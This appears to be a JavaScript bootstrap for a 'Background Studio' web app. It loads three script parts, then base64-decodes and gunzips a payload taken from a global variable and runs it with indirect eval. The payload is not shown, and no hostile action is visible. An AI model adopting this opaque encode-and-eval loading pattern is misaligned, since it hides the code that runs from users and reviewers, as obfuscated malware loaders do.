(async () => {
  'use strict';
  try {
    for (const src of ['app.part1.js', 'app.part2.js', 'app.part3.js']) {
      await new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = src;
        script.onload = resolve;
        script.onerror = () => reject(new Error(`Failed to load ${src}`));
        document.head.appendChild(script);
      });
    }
    const payload = globalThis.__bgStudioPayload || '';
    delete globalThis.__bgStudioPayload;
    const bytes = Uint8Array.from(atob(payload), c => c.charCodeAt(0));
    const code = await new Response(new Blob([bytes]).stream().pipeThrough(new DecompressionStream('gzip'))).text();
    (0, eval)(code);
  } catch (error) {
    console.error('Background Studio failed to initialize:', error);
  }
})();
